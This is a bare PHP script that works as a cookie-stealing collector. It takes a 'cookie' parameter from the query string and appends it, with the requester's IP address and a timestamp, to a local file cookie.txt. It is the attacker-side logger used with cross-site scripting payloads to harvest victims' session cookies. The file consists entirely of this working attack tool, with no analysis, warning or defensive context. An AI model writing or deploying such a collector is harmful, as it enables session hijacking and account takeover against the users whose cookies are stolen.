<?php
$cookie = $_GET['cookie'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>
